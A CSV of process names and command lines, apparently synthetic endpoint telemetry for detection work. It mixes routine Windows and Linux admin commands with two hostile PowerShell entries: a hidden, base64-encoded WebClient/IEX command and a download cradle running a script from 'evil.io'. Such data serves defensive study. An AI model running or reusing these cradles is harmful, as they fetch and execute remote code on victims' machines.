process_name,command_line
conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4
net.exe,net use Z: \\fileserver\share
net.exe,net use Z: \\fileserver\share
Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
reg.exe,reg query HKLM\Software\Microsoft\Windows /s
python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml  # session 140
ipconfig.exe,C:\Windows\System32\ipconfig.exe /all
RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
docker,docker ps --format '{{.Names}}'
schtasks.exe,schtasks /query /fo table
svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p  # session 180
Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
powershell.exe,powershell.exe -Command Get-Service -Name Spooler
OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
bash,bash -c 'ls -la /var/log'
nginx,nginx -g 'daemon off;'
net.exe,net use Z: \\fileserver\share
Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe
java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar
python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000  # session 124
explorer.exe,C:\Windows\Explorer.EXE
powershell.exe,powershell.exe Get-Process | Sort-Object CPU
reg.exe,reg query HKLM\Software\Microsoft\Windows /s
powershell.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
awk,awk '{print $1}' /var/log/syslog
bash,bash -c 'ls -la /var/log'
schtasks.exe,schtasks /query /fo table
powershell.exe,powershell.exe -Command Get-Service -Name Spooler  # session 108
docker,docker ps --format '{{.Names}}'
awk,awk '{print $1}' /var/log/syslog
wmic.exe,wmic logicaldisk get caption
docker,docker ps --format '{{.Names}}'
MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
powershell.exe,powershell -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.io/a.ps1')
awk,awk '{print $1}' /var/log/syslog
